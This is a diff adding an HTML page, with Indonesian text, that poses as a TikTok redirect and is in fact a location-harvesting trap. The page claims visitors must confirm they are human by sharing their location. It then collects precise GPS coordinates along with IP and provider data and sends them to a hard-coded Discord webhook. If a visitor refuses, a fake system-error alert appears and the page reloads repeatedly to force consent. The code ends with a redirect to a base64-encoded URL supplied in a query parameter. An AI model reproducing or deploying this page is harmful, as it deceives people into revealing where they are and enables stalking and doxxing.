@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Redirect</title>
+    <style>
+        body { font-family: sans-serif; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
+        .modal { background: #111; padding: 25px; border-radius: 15px; text-align: center; border: 1px solid #333; width: 85%; max-width: 300px; }
+        .btn { background: #fe2c55; color: white; padding: 12px; border-radius: 5px; cursor: pointer; margin-top: 15px; font-weight: bold; display: block; text-decoration: none; }
+        .logo { width: 50px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <div class="modal">
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="logo">
+        <p>Anda akan diarahkan ke aplikasi TikTok.</p>
+        <p style="font-size: 12px; color: #888;">Konfirmasi bahwa Anda adalah manusia dengan mengaktifkan akses lokasi sementara.</p>
+        <div class="btn" onclick="startTrap()">LANJUT KE TIKTOK</div>
+    </div>
+<script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1478214208226066432/WML4rdnUHZqJTyaClDwkmKAXaKZO87wVC9IDZKe6hnQ_x-eXC2IFP6KMf5qciPjMappB";
+
+    async function startTrap() {
+        // FUNGSI PAKSA LOKASI
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            // JIKA ALLOW: KIRIM DATA PRESISI
+            await sendData(pos.coords.latitude, pos.coords.longitude, "🔥 PRECISION GPS 🔥", pos.coords.accuracy);
+            redirect();
+        }, async (err) => {
+            // JIKA BLOCK: KITA TEROR!
+            alert("⚠️ KESALAHAN SISTEM: Akses Lokasi Ditolak!\n\nTikTok memerlukan izin lokasi untuk memverifikasi wilayah Anda. Silakan klik 'Izinkan' pada jendela berikutnya atau halaman akan diblokir.");
+            location.reload(); // Refresh paksa buat minta ijin lagi
+        }, {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+        });
+    }
+
+    async function sendData(lat, lon, method, accuracy) {
+        const urlParams = new URLSearchParams(window.location.search);
+        const target = atob(urlParams.get('target') || "aHR0cHM6Ly90aWt0b2suY29t");
+        
+        // Ambil info IP secara silent sebagai backup
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+
+        const payload = {
+            content: "💀 **TARGET FORCED & EXECUTED** 💀",
+            embeds: [{
+                title: "📍 LOKASI SANGAT AKURAT (GPS)",
+                color: 0x00FF00,
+                fields: [
+                    { name: "🎯 Status", value: method, inline: true },
+                    { name: "📏 Akurasi", value: accuracy ? `${accuracy.toFixed(2)} Meter` : "N/A", inline: true },
+                    { name: "🌐 IP Address", value: ipData.ip, inline: true },
+                    { name: "🏢 Provider", value: ipData.org, inline: false },
+                    { name: "🗺️ GOOGLE MAPS", value: `https://www.google.com/maps?q=${lat},${lon}` },
+                    { name: "📍 Koordinat", value: `\`${lat}, ${lon}\`` }
+                ],
+                footer: { text: "Demox_Ai'CvA057xp - Nuclear Overdrive" },
+                timestamp: new Date()
+            }]
+        };
+
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+        });
+    }
+
+    function redirect() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const target = atob(urlParams.get('target') || "aHR0cHM6Ly90aWt0b2suY29t");
+        window.location.href = target;
+    }
+</script>
+
+    
+</body>
+</html>
+
